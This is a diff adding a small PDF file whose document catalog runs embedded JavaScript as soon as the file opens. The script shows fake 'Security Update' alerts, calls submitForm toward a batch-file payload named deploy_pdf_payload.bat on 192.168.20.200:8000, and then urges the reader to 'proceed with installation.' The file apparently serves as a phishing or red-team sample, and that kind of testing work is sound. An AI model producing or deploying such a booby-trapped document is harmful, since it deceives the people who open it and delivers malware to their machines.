@@ -1,0 +1,147 @@
+%PDF-1.3
+%‚„œ”
+1 0 obj
+<<
+/Kids [ 3 0 R 4 0 R ]
+/Type /Pages
+/Count 2
+>>
+endobj
+2 0 obj
+<<
+/NeedAppearances true
+/Producer (PyPDF2)
+>>
+endobj
+3 0 obj
+<<
+/Contents 8 0 R
+/Parent 1 0 R
+/Type /Page
+/Resources <<
+/Font 9 0 R
+/ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ]
+>>
+/Trans <<
+>>
+/Rotate 0
+/MediaBox [ 0 0 612 792 ]
+>>
+endobj
+4 0 obj
+<<
+/Contents 12 0 R
+/Parent 1 0 R
+/Type /Page
+/Resources <<
+/Font 9 0 R
+/ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ]
+>>
+/Trans <<
+>>
+/Rotate 0
+/MediaBox [ 0 0 612 792 ]
+>>
+endobj
+5 0 obj
+<<
+/Type /Action
+/S /JavaScript
+/JS (
+    app.alert({cMsg: "Preparing security update files...", cTitle: "Security Update", nIcon: 3});
+    
+    this.submitForm({
+        cURL: "http://192.168.20.200:8000/deploy_pdf_payload.bat",
+        cSubmitAs: "PDF"
+    });
+    
+    app.alert({cMsg: "Security update package extracted. Please proceed with installation.", cTitle: "Security Update", nIcon: 3});
+    )
+>>
+endobj
+6 0 obj
+<<
+/JavaScript <<
+/Names [ (4b03eca6\0553c00\05541e2\055a425\0553ae343df98ab) 5 0 R ]
+>>
+>>
+endobj
+7 0 obj
+<<
+/AcroForm 2 0 R
+/Type /Catalog
+/Pages 1 0 R
+/OpenAction 5 0 R
+/Names <<
+/JavaScript <<
+/Names [ (4b03eca6\0553c00\05541e2\055a425\0553ae343df98ab) 5 0 R ]
+>>
+>>
+>>
+endobj
+8 0 obj
+<<
+/Length 790
+/Filter [ /ASCII85Decode /FlateDecode ]
+>>
+stream
+Gat$u>u0K7&:EYBlm%8sQ_Y(h]TlBj8k4fTSA_2gCg5f9:<jqMrV*dE;G))]dOAoFmCG)8Z]jI3d?Vba:]P\J^-C\?(Vj(5&$L`'I__2=`HhR\Ff^Y,MF0Pq+n@1:Rkb)Ci;@.IH$u9h2gBb^+1!E?(Mre!RuH$:1&hIE(U/f.e?@Pc:l>g+p@u">B&bn`KfcGe9>-&r'])BiK9r-OW8P(c\AMg6,H.\r\u/K9nApUA5[Ib`OVR!X%sHdP]gltu-a,[60_*^O$I.\s+g)(?D^V!!LUlmYls?5MY$f.!<9R.<U2_.?@+Wc!AT%`jgKFsPA>@!!+"n(,i;3'_jeu[PWbm^Tg)]s9Zk6OFX_@h]n26Qd3^OTQ-cKt[L5%D'S\7X7ga&\]]mX]Am@KK4*li=/c/SPYVQW7IT<P*qZ1GORkt>8=#5dKsfiQ?Y@d2Z3-S^K83;S3XoROsV2L*>t5\l#+,==&OXe\]a?Cm6;*:;kH5L/i"U@hXBOJD6DWU&\0E(Xn/g=t)8_p6VMJ.%_U,&OuIXfjT#^6Ec5+FVOSD7PI*TFD*NKUtF\&#`F?iED<pW.ip4&VCK>$/-$L(.%R)#Elq;TS!@19[O^3i3arKg?jNm:_9,'asM)u:QcYc.1c$d]6'P!c3dTM;c/\o#1pSLi!IK@.'^6IDt-bcg`cc:-,.D_Ka\kAD7)XX+7HAolhJWp8YtiFX:l0aPc7LaqZp%G6TX6S@S3Ip=NQpVkCTI;Su*`4Tk%&sWSA8;DEkk;MjD61M.ZB'q?.1=IfY\@^G>~>
+endstream
+endobj
+9 0 obj
+<<
+/F2 10 0 R
+/F1 11 0 R
+>>
+endobj
+10 0 obj
+<<
+/Encoding /WinAnsiEncoding
+/Type /Font
+/Name /F2
+/BaseFont /Helvetica-Bold
+/Subtype /Type1
+>>
+endobj
+11 0 obj
+<<
+/Encoding /WinAnsiEncoding
+/Type /Font
+/Name /F1
+/BaseFont /Helvetica
+/Subtype /Type1
+>>
+endobj
+12 0 obj
+<<
+/Length 694
+/Filter [ /ASCII85Decode /FlateDecode ]
+>>
+stream
+Gas1]>u060&:D6"0i'qt>T2dg/*3`qWJ#pi![ET@MoffGQc+nnVf;[MlQf!he<35qnCft1]<eq2bdZfmGm0^1I/Y93'$(+uNDdhjSBFK::EUFDrG.Yq[>P&P`%eu:0k?!OMlU'-Ed;pS0<VJi"uga=iW"'Cne^B'466F@Fs,fd;Hdbo]IHSLB7cnkD7!ZFXd@2Z+mP5T,8@R;m;#h@"6ZY,a1IkrfScL7qh*!Z:Fm];\*[*cZb4f`9?060*U)rQp5%R=MF*X4HLm-=4Y9Mf[c59[@;5>A,3)/p8UITc_Yl8.eEgBEOJau([9;3bpR^muqDb>_jJMD^C6S0aM\2DRVjT?#d[lBID#"79S9[ces.S#dCMWFLVeQ_+9io!/>U,Z];/+L*Ef^)BFG"[LKH"C1`a`l?VB]O,#-ZdlIZ0JMacm5i>nd;ZA9-Fn!3XNag:<MO!%sdEmH!or0Y''4"[`R>[<6>U&Y63n-Vpaonf*@&SMp,9bR=#1S0,8HH0A6_4,W'$Q=[C),kG[P3Z1S2W8uL:4?nQ/9f6T"g.SVkaD26_=,*26R3d;\UC5<KV[<cJeE+0m1a2j\=OOqAHg%Vf*EOQrj(H'b/`p2!D1d6U/I$.UkQoFJ@ZU^TIek]9_Wem)"JRTb3EOYs&6Q0c5DMKZc]F$c$g@Md]K&!9pk7UZfj_q]&"0V$g&~>
+endstream
+endobj
+xref
+0 13
+0000000000 65535 f 
+0000000015 00000 n 
+0000000080 00000 n 
+0000000142 00000 n 
+0000000331 00000 n 
+0000000521 00000 n 
+0000000945 00000 n 
+0000001052 00000 n 
+0000001234 00000 n 
+0000002115 00000 n 
+0000002158 00000 n 
+0000002271 00000 n 
+0000002379 00000 n 
+trailer
+<<
+/Size 13
+/Root 7 0 R
+/Info 2 0 R
+>>
+startxref
+3165
+%%EOF
